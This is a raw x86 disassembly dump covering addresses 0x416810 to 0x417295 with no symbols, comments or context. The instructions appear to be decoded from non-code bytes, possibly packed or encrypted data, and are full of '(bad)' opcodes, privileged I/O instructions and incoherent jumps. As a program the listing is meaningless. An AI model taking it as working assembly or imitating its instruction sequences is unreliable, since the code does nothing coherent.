  416810:	jecxz  0x41681e
  416812:	add    BYTE PTR [edi],ch
  416814:	fst    QWORD PTR [ecx+ebp*8+0x19]
  416818:	dec    esp
  416819:	aaa    
  41681a:	fist   DWORD PTR [ebp-0x59]
  41681d:	ffree  st(4)
  41681f:	dec    edx
  416820:	ret    0x973a
  416823:	ds cmc 
  416825:	clc    
  416826:	jae    0x41681b
  416828:	int    0xf5
  41682a:	inc    ebx
  41682b:	push   cs
  41682c:	jmp    0x146f:0x93a7a2ca
  416833:	mov    dl,0xfd
  416835:	pop    ss
  416836:	sahf   
  416837:	sub    esi,DWORD PTR [ebx+edi*8+0x7b]
  41683b:	inc    esp
  41683c:	inc    edx
  41683d:	loop   0x416803
  41683f:	push   ds
  416840:	icebp  
  416841:	dec    ebx
  416842:	cmp    eax,0x86e7556a
  416847:	push   eax
  416848:	mov    ch,0x6
  41684a:	jge    0x4168c5
  41684c:	aam    0x88
  41684e:	cwde   
  41684f:	ds mov dl,0x6c
  416852:	into   
  416853:	xchg   esp,eax
  416854:	or     BYTE PTR [ecx+0x19],ah
  416857:	dec    esp
  416858:	xchg   ebx,eax
  416859:	push   ds
  41685a:	in     eax,dx
  41685b:	daa    
  41685c:	jg     0x41688d
  41685e:	adc    eax,DWORD PTR [ebx-0x6]
  416861:	or     al,BYTE PTR [esp+ebx*2+0x51b7e7b3]
  416868:	ins    DWORD PTR es:[edi],dx
  416869:	ret    0x827e
  41686c:	sub    al,0x91
  41686e:	std    
  41686f:	pusha  
  416870:	xor    DWORD PTR [edi+0x9],edi
  416873:	call   0x9a4e:0x7f43e6b
  41687a:	and    BYTE PTR [ecx-0x1f6108fe],cl
  416880:	(bad)  
  416882:	mov    eax,eax
  416884:	sar    cl,0x56
  416887:	test   eax,0xbefe966
  41688c:	add    DWORD PTR [eax-0x5e246aa],ebx
  416892:	vpsubsw ymm4,ymm2,YMMWORD PTR [edx+0x7c]
  416897:	xchg   ecx,eax
  416898:	cmp    eax,0xe358eb7a
  41689d:	gs push esp
  41689f:	fld    DWORD PTR [ecx-0x3a411362]
  4168a5:	xchg   ebp,eax
  4168a6:	xlat   BYTE PTR ds:[ebx]
  4168a7:	cld    
  4168a8:	lea    eax,[edx]
  4168aa:	loop   0x4168f9
  4168ac:	mov    edx,0xe5a4ce7f
  4168b1:	and    eax,0xb8981283
  4168b6:	fnclex 
  4168b8:	(bad)  
  4168b9:	outs   dx,DWORD PTR ds:[esi]
  4168ba:	imul   edx,DWORD PTR [eax+esi*4-0x79],0x65
  4168bf:	or     eax,0x30
	...
  416934:	inc    ebp
  416935:	mov    BYTE PTR [edi+esi*2],ch
  416938:	in     eax,dx
  416939:	neg    DWORD PTR [edi-0x46]
  41693c:	push   eax
  41693d:	inc    ebp
  41693e:	push   ss
  41693f:	xor    DWORD PTR [edi-0x39173874],edi
  416945:	test   BYTE PTR [eax],0x0
  416948:	cmc    
  416949:	add    BYTE PTR [eax],al
  41694b:	add    cl,ch
  41694d:	mov    gs,esi
  41694f:	jp     0x4169b8
  416951:	daa    
  416952:	fdivr  st(3),st
  416954:	bound  eax,QWORD PTR [edi+edi*8+0xf]
  416958:	dec    BYTE PTR [esi-0x795bf211]
  41695e:	test   al,0xed
  416960:	or     DWORD PTR [ebp-0x3f],edi
  416963:	fisubr DWORD PTR [esi+0x1e]
  416966:	sub    ebp,esp
  416968:	stos   BYTE PTR es:[edi],al
  416969:	ret    
  41696a:	and    ecx,esi
  41696c:	and    DWORD PTR [esi-0x2a],0x38
  416970:	jge    0x4169e4
  416972:	and    DWORD PTR [ebx],edi
  416974:	mov    ebp,0x76ca28e7
  416979:	jo     0x4169d6
  41697b:	inc    edi
  41697c:	sbb    ah,BYTE PTR [eax]
  41697e:	in     eax,0x74
  416980:	sub    edi,esp
  416982:	(bad)  
  416983:	inc    edi
  416984:	sti    
  416985:	jae    0x416916
  416987:	adc    BYTE PTR [edi-0x25],bh
  41698a:	sti    
  41698b:	loop   0x416978
  41698d:	lahf   
  41698e:	xchg   esp,eax
  41698f:	or     ebx,DWORD PTR [ecx-0x10]
  416992:	xchg   BYTE PTR [edx],cl
  416994:	iret   
  416995:	push   ebx
  416996:	mov    dl,0xf7
  416998:	hlt    
  416999:	aad    0x61
  41699b:	cmp    cl,dh
  41699d:	xor    esi,DWORD PTR [ebx+0x6ae9d388]
  4169a3:	jbe    0x41695a
  4169a5:	dec    eax
  4169a6:	cmp    ah,BYTE PTR [ebx]
  4169a8:	scas   al,BYTE PTR es:[edi]
  4169a9:	test   esi,esi
  4169ab:	adc    al,0x62
  4169ad:	jecxz  0x416936
  4169af:	cmp    eax,0xb7e8167d
  4169b4:	dec    edi
  4169b5:	fcom   QWORD PTR [ebx-0x10e5eb16]
  4169bb:	push   ds
  4169bc:	jno    0x416980
  4169be:	in     eax,dx
  4169bf:	push   0x1a17c469
  4169c4:	repz jno 0x416a44
  4169c7:	jg     0x416a04
  4169c9:	adc    edi,eax
  4169cb:	jnp    0x416a33
  4169cd:	stos   BYTE PTR es:[edi],al
  4169ce:	mov    ecx,0x3a0a0b39
  4169d3:	arpl   WORD PTR [ecx],sp
  4169d5:	jo     0x41695e
  4169d7:	xor    BYTE PTR [ebp+0x5a],bh
  4169da:	sub    al,0x29
  4169dc:	daa    
  4169dd:	ret    0x7d3b
  4169e0:	push   ebx
  4169e1:	addr16 cdq 
  4169e3:	std    
  4169e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169e5:	out    0x31,al
  4169e7:	fisub  WORD PTR [edx+0x5b16a47d]
  4169ed:	adc    BYTE PTR [edi],ah
  4169ef:	adc    DWORD PTR [esi+0xcc9eae2],edi
  4169f5:	imul   BYTE PTR [ebx-0x50]
  4169f8:	xchg   ecx,eax
  4169f9:	xchg   esp,eax
  4169fa:	add    BYTE PTR [edx-0x2991fb14],0xe8
  416a01:	bound  esi,QWORD PTR [edx+0x5e]
  416a04:	add    edx,ebp
  416a06:	lahf   
  416a07:	sbb    al,0xb0
  416a09:	pop    ebp
  416a0a:	cld    
  416a0b:	mov    dl,0x6a
  416a0d:	mov    ecx,0x354aa8a7
  416a12:	scas   eax,DWORD PTR es:[edi]
  416a13:	ins    BYTE PTR es:[edi],dx
  416a14:	xchg   ebx,eax
  416a15:	dec    ebx
  416a16:	aaa    
  416a17:	inc    edx
  416a18:	add    eax,0x27d4dd5d
  416a1d:	lock xor DWORD PTR [eax],ebp
  416a20:	cdq    
  416a21:	push   cs
  416a22:	mov    ds:0xf7a11751,eax
  416a27:	mov    dl,BYTE PTR [ecx-0x13]
  416a2a:	adc    ebx,esi
  416a2c:	retf   0xe5dc
  416a2f:	sub    esp,DWORD PTR [eax-0x73f8d8b4]
  416a35:	cdq    
  416a36:	mov    al,ds:0xa025601
  416a3b:	lock inc ecx
  416a3d:	xchg   ebp,eax
  416a3e:	xor    DWORD PTR [edi+0x1a],ebx
	...
  416ab1:	add    BYTE PTR [eax],al
  416ab3:	add    bh,bl
  416ab5:	mov    esi,0xbb659205
  416aba:	(bad)  
  416abc:	nop
  416abd:	fmul   QWORD PTR [ebx-0x468cc6ae]
  416ac3:	or     bh,BYTE PTR [ebx-0xaffff09]
  416ac9:	add    BYTE PTR [eax],al
  416acb:	add    BYTE PTR [edx-0x1b],ah
  416ace:	out    dx,al
  416acf:	xchg   edi,eax
  416ad0:	and    bl,BYTE PTR [ebp+0x70]
  416ad3:	inc    esi
  416ad4:	mov    gs,WORD PTR [ebx-0x2e]
  416ad7:	sahf   
  416ad8:	mov    al,ds:0x22ad9628
  416ade:	jns    0x416b4a
  416ae0:	retf   0xbfd0
  416ae3:	les    esp,FWORD PTR [eax]
  416ae5:	xor    BYTE PTR [edx],cl
  416ae7:	loop   0x416aac
  416ae9:	sbb    esi,esp
  416aeb:	and    BYTE PTR [ecx-0x5153d0da],ah
  416af1:	fldcw  WORD PTR [edx+0x4ed6b4]
  416af7:	inc    edi
  416af8:	or     DWORD PTR [ebx-0x4e],ebp
  416afb:	call   0xc85025af
  416b00:	add    ch,BYTE PTR [ebx]
  416b02:	sub    eax,0x4ecba528
  416b07:	pop    es
  416b08:	lods   al,BYTE PTR ds:[esi]
  416b09:	sbb    BYTE PTR [eax],ah
  416b0b:	add    BYTE PTR [edi+0x37],0x69
  416b0f:	sub    ah,BYTE PTR [esi+0x7125f864]
  416b15:	push   esi
  416b16:	add    al,0x36
  416b18:	fdiv   QWORD PTR [ebx+0x7a]
  416b1b:	pop    eax
  416b1c:	mov    ebx,0x45b3b005
  416b21:	dec    ecx
  416b22:	add    bh,dh
  416b24:	push   ecx
  416b25:	(bad)  
  416b26:	pusha  
  416b27:	add    ebx,DWORD PTR [edx]
  416b29:	jae    0x416b4c
  416b2b:	jns    0x416b84
  416b2d:	add    BYTE PTR [ecx-0x2b36afe2],0x2c
  416b34:	mov    edi,0x6fe335ea
  416b39:	dec    DWORD PTR [edx+0x10]
  416b3c:	sbb    al,0xd4
  416b3e:	mov    edi,0xefc31ed3
  416b43:	adc    DWORD PTR [ecx],0x67b650f3
  416b49:	mov    dl,BYTE PTR [ecx+0x53d7722b]
  416b4f:	jnp    0x416b52
  416b51:	cdq    
  416b52:	les    ecx,FWORD PTR ds:0xbcc36502
  416b58:	push   es
  416b59:	pushf  
  416b5a:	push   esp
  416b5b:	inc    edi
  416b5c:	pop    eax
  416b5d:	or     DWORD PTR [ecx+0x7ee01669],esi
  416b63:	fld    DWORD PTR [ecx+eiz*1-0x46247e3e]
  416b6a:	cmp    eax,0xbec3cc91
  416b6f:	je     0x416bcc
  416b71:	mov    ds:0xe9309d7e,eax
  416b76:	push   cs
  416b77:	outs   dx,DWORD PTR ds:[esi]
  416b78:	jb     0x416bce
  416b7a:	jne    0x416b87
  416b7c:	stos   DWORD PTR es:[edi],eax
  416b7d:	jle    0x416b23
  416b7f:	xchg   edi,eax
  416b80:	loop   0x416b57
  416b82:	sahf   
  416b83:	call   DWORD PTR [ebp+0x6f]
  416b86:	jo     0x416bcb
  416b88:	sbb    esp,esi
  416b8a:	test   BYTE PTR [edi+0x3637d680],ch
  416b90:	jg     0x416bb7
  416b92:	xlat   BYTE PTR ds:[ebx]
  416b93:	out    dx,eax
  416b94:	sub    eax,0xa0f19d93
  416b99:	push   ebp
  416b9a:	pop    ecx
  416b9b:	iret   
  416b9c:	imul   BYTE PTR [edx]
  416b9e:	push   ecx
  416b9f:	ret    
  416ba0:	or     BYTE PTR [edi-0x62],dl
  416ba3:	shr    dh,0x82
  416ba6:	cmp    edi,esi
  416ba8:	xor    al,0x83
  416baa:	mov    cl,0x9a
  416bac:	es jecxz 0x416b87
  416baf:	ss pop ebx
  416bb1:	xchg   esp,eax
  416bb2:	int    0xe0
  416bb4:	aas    
  416bb5:	shl    DWORD PTR [esi-0x19],cl
  416bb8:	dec    eax
  416bb9:	sahf   
  416bba:	stos   DWORD PTR es:[edi],eax
  416bbb:	popf   
  416bbc:	repz cmp BYTE PTR [ecx-0x33],dh
  416bc0:	push   ebx
	...
  416c31:	add    BYTE PTR [eax],al
  416c33:	add    BYTE PTR [edx],bh
  416c35:	adc    BYTE PTR [edi-0x444040c4],bh
  416c3b:	push   ss
  416c3c:	add    ebx,DWORD PTR [eax-0x29]
  416c3f:	adc    esp,DWORD PTR [ecx]
  416c41:	ins    DWORD PTR es:[edi],dx
  416c42:	lahf   
  416c43:	daa    
  416c44:	mov    al,0xf8
  416c46:	add    BYTE PTR [eax],al
  416c48:	cmc    
  416c49:	add    BYTE PTR [eax],al
  416c4b:	add    BYTE PTR [edi+ecx*8+0x50],dl
  416c4f:	jae    0x416bf2
  416c51:	mov    dh,0x4d
  416c53:	stc    
  416c54:	or     BYTE PTR [esi+0x2e],ah
  416c57:	pop    edi
  416c58:	jecxz  0x416cc5
  416c5a:	test   BYTE PTR [eax+0x7e],0x6b
  416c5e:	inc    edi
  416c5f:	retf   0xcd6d
  416c62:	pop    esp
  416c63:	addr16 jns 0x416c03
  416c66:	repz sub DWORD PTR [ebx-0x387c84f2],ebx
  416c6d:	push   ebp
  416c6e:	sub    BYTE PTR ds:0x7b1f8f48,0x3
  416c75:	push   ebx
  416c76:	or     bh,dl
  416c78:	pop    ebx
  416c79:	push   esp
  416c7a:	cdq    
  416c7b:	mov    edx,0xa053bb47
  416c80:	ds mov cl,0x98
  416c83:	dec    ecx
  416c84:	push   DWORD PTR [edx+0x68]
  416c87:	add    eax,0xf2b188d4
  416c8c:	jp     0x416d01
  416c8e:	add    eax,0x267722e7
  416c93:	lock lock and eax,0x7a17a92e
  416c9a:	cs in  al,dx
  416c9c:	(bad)  
  416c9d:	sub    BYTE PTR ss:[esi+0x5a7bbe9c],0x30
  416ca5:	xchg   ebx,eax
  416ca6:	or     BYTE PTR [ebx],dh
  416ca8:	mov    ?,WORD PTR [esi-0x356e5042]
  416cae:	mov    ds:0x1cabaaaa,al
  416cb3:	pop    eax
  416cb4:	test   BYTE PTR [eax+esi*1+0x7d],bh
  416cb8:	cdq    
  416cb9:	add    BYTE PTR [bp+di-0x6a],dh
  416cbd:	mov    ebx,0x6ab999df
  416cc2:	mov    ds:0xcfff50b8,al
  416cc7:	and    al,bh
  416cc9:	push   ebp
  416cca:	mov    dh,0x19
  416ccc:	lock mov esi,0x3f33c035
  416cd2:	das    
  416cd3:	cwde   
  416cd4:	xor    bl,al
  416cd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cd7:	(bad)  
  416cd8:	clc    
  416cd9:	je     0x416d00
  416cdb:	test   DWORD PTR [ebp+ebp*1+0x34fdbac9],ebx
  416ce2:	(bad)  
  416ce3:	(bad)  
  416ce4:	scas   eax,DWORD PTR es:[edi]
  416ce5:	dec    edi
  416ce6:	iret   
  416ce7:	ds loop 0x416d47
  416cea:	jo     0x416c92
  416cec:	data16 cmp BYTE PTR [eax],bh
  416cef:	gs mov bl,0x3e
  416cf2:	pop    ebp
  416cf3:	cmc    
  416cf4:	shr    BYTE PTR [eax-0x4fa3097f],0xf
  416cfb:	mov    esi,fs
  416cfd:	(bad)  
  416cfe:	out    0x86,al
  416d00:	idiv   BYTE PTR [edx+0x12]
  416d03:	aad    0x77
  416d05:	outs   dx,BYTE PTR ds:[esi]
  416d06:	mov    ebx,DWORD PTR [ebx-0x2d040862]
  416d0c:	xor    al,0xa6
  416d0e:	frstor [edx+0x5e]
  416d11:	mov    ecx,0x5cdf18f4
  416d16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d17:	(bad)  
  416d18:	stos   BYTE PTR es:[edi],al
  416d19:	pop    edx
  416d1a:	(bad)  
  416d1b:	mov    al,0x6e
  416d1d:	ins    DWORD PTR es:[edi],dx
  416d1e:	cwde   
  416d1f:	jge    0x416d94
  416d21:	sbb    esp,ebx
  416d23:	sub    bl,bl
  416d25:	iret   
  416d26:	cli    
  416d27:	bound  edx,QWORD PTR [ecx+0x6a]
  416d2a:	cld    
  416d2b:	push   es
  416d2c:	dec    esi
  416d2d:	retf   
  416d2e:	mov    ds:0x33c60d03,eax
  416d33:	add    BYTE PTR [ebx-0x10a30d8b],ah
  416d39:	sahf   
  416d3a:	in     al,0xde
  416d3c:	repz mov al,ds:0xd9ed0
	...
  416db2:	add    BYTE PTR [eax],al
  416db4:	out    dx,al
  416db5:	repnz cmc 
  416db7:	add    edi,ebp
  416db9:	pop    es
  416dba:	(bad)  
  416dbb:	inc    edx
  416dbd:	xchg   ebx,eax
  416dbe:	pusha  
  416dbf:	push   0x2b46dc4b
  416dc4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416dc5:	stc    
  416dc6:	add    BYTE PTR [eax],al
  416dc8:	cmc    
  416dc9:	add    BYTE PTR [eax],al
  416dcb:	add    BYTE PTR [ebp+edi*8-0x17],ch
  416dcf:	dec    ebp
  416dd0:	cmp    al,0xf1
  416dd2:	mov    ah,0x1d
  416dd4:	mov    bl,0x18
  416dd6:	or     DWORD PTR ds:0x54e81283,ecx
  416ddc:	mov    ebx,0xd67071aa
  416de1:	stos   BYTE PTR es:[edi],al
  416de2:	dec    ebx
  416de3:	ins    BYTE PTR es:[edi],dx
  416de4:	mov    gs,WORD PTR [edx-0x19da88e1]
  416dea:	and    al,0x69
  416dec:	sub    eax,0xdf2a966b
  416df1:	ja     0x416dde
  416df3:	sbb    ch,BYTE PTR [ebp+0x43e5df2a]
  416df9:	inc    edx
  416dfa:	sti    
  416dfb:	outs   dx,DWORD PTR ds:[esi]
  416dfc:	imul   esi,DWORD PTR [eax],0xa023ed81
  416e02:	mul    DWORD PTR [esi-0x2d8b8a1e]
  416e08:	mov    bl,cl
  416e0a:	dec    ecx
  416e0b:	add    bh,BYTE PTR [esi+0x2]
  416e0e:	xchg   ecx,eax
  416e0f:	cmp    DWORD PTR [edi-0x3b],edi
  416e12:	(bad)  
  416e13:	loop   0x416e13
  416e15:	ins    BYTE PTR es:[edi],dx
  416e16:	icebp  
  416e17:	push   esi
  416e18:	jle    0x416e33
  416e1a:	inc    eax
  416e1b:	dec    edi
  416e1c:	retf   
  416e1d:	dec    ebp
  416e1e:	(bad)  
  416e1f:	or     DWORD PTR [ebx-0x75f803e6],eax
  416e25:	cld    
  416e26:	sub    al,dl
  416e28:	ret    0x2b6f
  416e2b:	and    al,0xfc
  416e2d:	xor    dh,dh
  416e2f:	xchg   esi,eax
  416e30:	arpl   WORD PTR [edi-0xa],bp
  416e33:	dec    ebx
  416e34:	dec    edi
  416e35:	and    ch,BYTE PTR [ecx-0x40e1fe0d]
  416e3b:	dec    eax
  416e3c:	mov    esi,0x3b44e39
  416e41:	add    esi,edi
  416e43:	data16 test BYTE PTR [edi+0x1c841686],ah
  416e4a:	mov    dh,0x4d
  416e4c:	sub    DWORD PTR [ebx],eax
  416e4e:	or     BYTE PTR [edi+0x71],al
  416e51:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e52:	xor    dh,BYTE PTR [eax]
  416e54:	fwait
  416e55:	jge    0x416e56
  416e57:	dec    esi
  416e58:	pop    eax
  416e59:	sbb    eax,0x4088c94
  416e5e:	pusha  
  416e5f:	fimul  WORD PTR [esi+edx*2+0x4a1f887b]
  416e66:	fstp   st(2)
  416e68:	jle    0x416e06
  416e6a:	pop    edx
  416e6b:	fdivr  QWORD PTR [edi-0x7a50f210]
  416e71:	rcl    DWORD PTR [ebx],0x9f
  416e74:	mov    al,0x3b
  416e76:	xor    esp,esi
  416e78:	add    eax,0x62533b5b
  416e7d:	call   0xe369:0x805c6ec3
  416e84:	fistp  QWORD PTR [edx]
  416e86:	bound  esi,QWORD PTR [eax+edx*2]
  416e89:	xchg   BYTE PTR [eax],dl
  416e8b:	leave  
  416e8c:	mov    ds:0x73f1a0be,al
  416e91:	xchg   ebp,eax
  416e92:	sub    BYTE PTR [ecx],0x35
  416e95:	jno    0x416e75
  416e97:	(bad)  
  416e98:	repz add esi,edi
  416e9b:	push   ss
  416e9c:	ficomp WORD PTR ds:0xe0067706
  416ea2:	push   ecx
  416ea3:	sub    al,0x7a
  416ea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ea6:	or     BYTE PTR [edx-0x1eba6248],bh
  416eac:	xchg   DWORD PTR [ebp+eax*1-0x52e6bac9],esp
  416eb3:	imul   esp,DWORD PTR [esi+esi*2-0x67ee830a],0xd
  416ebb:	dec    ebx
  416ebc:	sub    esp,edi
  416ebe:	lahf   
  416ebf:	xor    al,0xdb
	...
  416f31:	add    BYTE PTR [eax],al
  416f33:	add    BYTE PTR [edi],dl
  416f35:	mov    BYTE PTR [esi-0x6e],ch
  416f38:	push   esi
  416f3a:	dec    DWORD PTR [ebp-0x2a075371]
  416f40:	or     al,0x4a
  416f42:	(bad)  
  416f43:	mov    al,0x9a
  416f45:	cli    
  416f46:	add    BYTE PTR [eax],al
  416f48:	cmc    
  416f49:	add    BYTE PTR [eax],al
  416f4b:	add    bh,bl
  416f4d:	ja     0x416fa4
  416f4f:	fldcw  WORD PTR [esi+0x5e]
  416f52:	mov    ah,0x8d
  416f54:	xor    DWORD PTR [ecx+0x46],ebx
  416f57:	ficomp DWORD PTR [ebx]
  416f59:	pop    eax
  416f5a:	aaa    
  416f5b:	cs mov ch,0x60
  416f5e:	das    
  416f5f:	dec    sp
  416f61:	lds    ebp,FWORD PTR [edi+ecx*1]
  416f64:	iret   
  416f65:	out    0x17,eax
  416f67:	inc    esi
  416f68:	leave  
  416f69:	lahf   
  416f6a:	push   esp
  416f6b:	add    BYTE PTR [edi+eax*8],bh
  416f6e:	ins    DWORD PTR es:[edi],dx
  416f6f:	adc    ch,BYTE PTR [ecx]
  416f71:	dec    ecx
  416f72:	xor    BYTE PTR [edx+0x12],ah
  416f75:	jg     0x416fda
  416f77:	nop
  416f78:	xor    al,0x89
  416f7a:	jno    0x416f82
  416f7c:	arpl   WORD PTR [edi+0x24],ax
  416f7f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416f80:	and    eax,0xd1a6ae63
  416f85:	es mov al,0x73
  416f88:	pop    esi
  416f89:	dec    esi
  416f8a:	lock push edx
  416f8c:	call   DWORD PTR [edx]
  416f8e:	mov    ah,0x3e
  416f90:	xchg   edi,esi
  416f92:	mov    DWORD PTR [esi+0x43],0x6f7cd00c
  416f99:	sub    bh,BYTE PTR [esi+eiz*4]
  416f9c:	and    DWORD PTR [ebx-0x438cf723],edi
  416fa2:	xchg   esp,eax
  416fa3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416fa4:	push   esp
  416fa5:	push   esi
  416fa6:	push   ebp
  416fa7:	nop
  416fa8:	jp     0x417019
  416faa:	popf   
  416fab:	aas    
  416fac:	jno    0x41702a
  416fae:	imul   ebp,DWORD PTR [ebx],0xafd38f9f
  416fb4:	or     BYTE PTR [ecx],cl
  416fb6:	jp     0x416fad
  416fb8:	xchg   ebp,eax
  416fb9:	or     DWORD PTR [ecx],eax
  416fbb:	iret   
  416fbc:	nop
  416fbd:	idiv   DWORD PTR [esi-0x63d679a8]
  416fc3:	jg     0x416fcd
  416fc5:	stos   BYTE PTR es:[edi],al
  416fc6:	hlt    
  416fc7:	mov    dh,0x9e
  416fc9:	mov    bh,0xcb
  416fcb:	cli    
  416fcc:	stos   BYTE PTR es:[edi],al
  416fcd:	je     0x41700a
  416fcf:	push   0x4ab76c1
  416fd4:	dec    eax
  416fd5:	(bad)  
  416fd7:	inc    ecx
  416fd8:	or     eax,0xf013506d
  416fdd:	xor    al,0x8e
  416fdf:	push   ss
  416fe0:	pop    esi
  416fe1:	ins    DWORD PTR es:[edi],dx
  416fe2:	ja     0x417060
  416fe4:	or     cl,BYTE PTR [ecx-0x76a2d1d0]
  416fea:	pop    ecx
  416feb:	retf   
  416fec:	sub    al,0x4b
  416fee:	mov    al,0xfe
  416ff0:	dec    esp
  416ff1:	mov    ch,0x35
  416ff3:	(bad)  
  416ff4:	iret   
  416ff5:	repz scas eax,DWORD PTR es:[edi]
  416ff7:	shl    BYTE PTR [esi],1
  416ff9:	xchg   ebx,eax
  416ffa:	sbb    ecx,DWORD PTR [ebx+0x14c33778]
  417000:	cli    
  417001:	add    DWORD PTR [ebx+0x9],edx
  417004:	jmp    0x417012
  417006:	out    0xcb,eax
  417008:	inc    ebx
  417009:	and    eax,0xfd1ad7aa
  41700e:	les    esp,FWORD PTR [edi+0x57]
  417011:	or     al,0xaa
  417013:	daa    
  417014:	cmp    edx,DWORD PTR [edi]
  417016:	push   cs
  417017:	gs aad 0xb6
  41701a:	cmp    BYTE PTR [ebx-0x57],ch
  41701d:	jns    0x41709e
  41701f:	test   al,0xd1
  417021:	ins    BYTE PTR es:[edi],dx
  417022:	push   ds
  417023:	sbb    eax,0x6c9b293
  417028:	sub    al,0xe8
  41702a:	pop    esp
  41702b:	sub    edx,ebx
  41702d:	cwde   
  41702e:	mov    ebp,0xc56c74fe
  417033:	mov    WORD PTR [esi+0x34942e31],gs
  417039:	mov    al,ds:0xe0322c92
  41703e:	pop    eax
  41703f:	dec    esp
  417040:	mov    eax,DWORD PTR [eax]
	...
  4170b2:	add    BYTE PTR [eax],al
  4170b4:	and    cl,ch
  4170b6:	cmp    ebx,esi
  4170b8:	sti    
  4170b9:	fsubrp st(5),st
  4170bb:	dec    DWORD PTR [ecx+0x49]
  4170be:	ret    
  4170bf:	and    DWORD PTR [edi-0x705adac7],0xfffffffb
  4170c6:	add    BYTE PTR [eax],al
  4170c8:	cmc    
  4170c9:	add    BYTE PTR [eax],al
  4170cb:	add    BYTE PTR [edx+edx*2-0x5ac0c464],bh
  4170d2:	jge    0x417135
  4170d4:	pop    esi
  4170d5:	ror    ebx,0x99
  4170d8:	data16 jo 0x41705e
  4170db:	dec    ecx
  4170dc:	and    bl,BYTE PTR ds:[esp+edi*4+0x19]
  4170e1:	sbb    edi,DWORD PTR [esi]
  4170e3:	push   ds
  4170e4:	xchg   ecx,eax
  4170e5:	ss xchg ecx,eax
  4170e7:	jle    0x4170a9
  4170e9:	sub    eax,0x8301d273
  4170ee:	gs jmp 0x24ad7675
  4170f4:	js     0x417117
  4170f6:	loope  0x417078
  4170f8:	fidivr WORD PTR [ecx+ecx*1]
  4170fb:	dec    ebx
  4170fc:	arpl   sp,ax
  4170fe:	in     al,0xdb
  417100:	pop    ebx
  417101:	mov    dl,0xd7
  417103:	mov    al,0x1b
  417105:	xchg   esp,eax
  417106:	out    dx,eax
  417107:	push   0x2b
  417109:	inc    eax
  41710a:	in     al,dx
  41710b:	pop    edi
  41710c:	fwait
  41710d:	xchg   DWORD PTR [eax+0x555339a8],edi
  417113:	mov    esi,0x368a2f71
  417118:	push   ebx
  417119:	cmp    al,0x16
  41711b:	mov    esi,0x9e309b99
  417120:	cdq    
  417121:	lahf   
  417122:	sub    eax,0x125f5297
  417127:	jno    0x4170f8
  417129:	into   
  41712a:	shl    BYTE PTR [edi],1
  41712c:	push   esi
  41712d:	inc    esi
  41712e:	mov    esi,0x5aecc0c4
  417133:	jl     0x417165
  417135:	and    eax,0xa2da95a6
  41713a:	mov    bl,0x69
  41713c:	or     dl,ah
  41713e:	sbb    BYTE PTR [ecx],dh
  417140:	pop    ebx
  417141:	fisub  DWORD PTR [ecx]
  417143:	push   0x13
  417145:	enter  0x7b76,0x1f
  417149:	pop    ebx
  41714a:	pop    eax
  41714b:	lea    edx,[esi]
  41714d:	sbb    BYTE PTR [eax+0x69],al
  417150:	fadd   DWORD PTR [esi]
  417152:	push   eax
  417153:	(bad)  
  417157:	test   eax,0x4bc71da5
  41715c:	push   edi
  41715d:	sar    DWORD PTR [eax-0x64],cl
  417160:	cmp    dl,bh
  417162:	push   ss
  417163:	fcmovu st,st(4)
  417165:	pop    DWORD PTR [edx]
  417167:	das    
  417168:	xor    BYTE PTR [eax-0x64],0x71
  41716c:	cdq    
  41716d:	(bad)  
  41716e:	scas   eax,DWORD PTR es:[edi]
  41716f:	lods   al,BYTE PTR ds:[esi]
  417170:	push   es
  417171:	pushf  
  417172:	inc    eax
  417173:	stos   BYTE PTR es:[edi],al
  417174:	popf   
  417175:	mov    dh,0xd6
  417177:	ss mov ecx,ebx
  41717a:	and    bl,BYTE PTR [ebx]
  41717c:	or     dl,BYTE PTR [edx-0x24405c67]
  417182:	add    eax,0xad8aaa5d
  417187:	inc    esi
  417188:	pusha  
  417189:	ret    0xe614
  41718c:	daa    
  41718d:	pop    edi
  41718e:	outs   dx,DWORD PTR ds:[esi]
  41718f:	mov    al,BYTE PTR cs:[eax+eax*2]
  417193:	mov    eax,0xa5d06747
  417198:	loop   0x4171be
  41719a:	int3   
  41719b:	jmp    0x417148
  41719d:	in     al,dx
  41719e:	sub    eax,0xccc0a7d0
  4171a3:	lea    ebp,[ebx+0x31adbd2c]
  4171a9:	xor    eax,0x36b1abe
  4171ae:	aas    
  4171af:	mul    BYTE PTR [eax]
  4171b1:	push   esi
  4171b2:	inc    edi
  4171b3:	pop    esi
  4171b4:	icebp  
  4171b5:	aas    
  4171b6:	std    
  4171b7:	push   ecx
  4171b8:	test   al,0x69
  4171ba:	je     0x4171b5
  4171bc:	fwait
  4171bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4171be:	js     0x417192
  4171c0:	xchg   edi,eax
	...
  417231:	add    BYTE PTR [eax],al
  417233:	add    BYTE PTR [ebx],ah
  417235:	outs   dx,BYTE PTR ds:[esi]
  417236:	xor    ah,BYTE PTR ds:0x6e377d7f
  41723c:	or     BYTE PTR [ebx-0x1b],dl
  41723f:	data16 fmul DWORD PTR [edi+eax*8+0x1]
  417244:	test   ah,bh
  417246:	add    BYTE PTR [eax],al
  417248:	cmc    
  417249:	add    BYTE PTR [eax],al
  41724b:	add    ch,bl
  41724d:	pop    esp
  41724e:	mov    bl,0x54
  417250:	into   
  417251:	adc    eax,0x3d8b5353
  417256:	test   eax,0xe3144ae0
  41725b:	push   ecx
  41725c:	xor    ah,BYTE PTR es:[esi]
  41725f:	xor    ecx,DWORD PTR [edi-0x573ba585]
  417265:	test   eax,esi
  417267:	loope  0x41723c
  417269:	in     al,dx
  41726a:	adc    ecx,DWORD PTR [ebp-0xe]
  41726d:	rcl    DWORD PTR [edx+0x1d07c220],1
  417273:	add    BYTE PTR [edi],0xc1
  417276:	push   ss
  417277:	mov    ah,0x22
  417279:	cmp    ebp,DWORD PTR [ecx+0x4728efb8]
  41727f:	inc    esp
  417280:	cmp    eax,0x11722509
  417285:	inc    ebp
  417286:	popa   
  417287:	pslld  mm2,QWORD PTR [eax+ebx*1]
  41728b:	outs   dx,DWORD PTR ds:[esi]
  41728c:	xor    al,0xeb
  41728e:	mov    bl,0x2f
  417290:	or     bh,bh
  417292:	imul   esi,edx,0x58
  417295:	xor    BYTE PTR [eax-0x4b],0x31
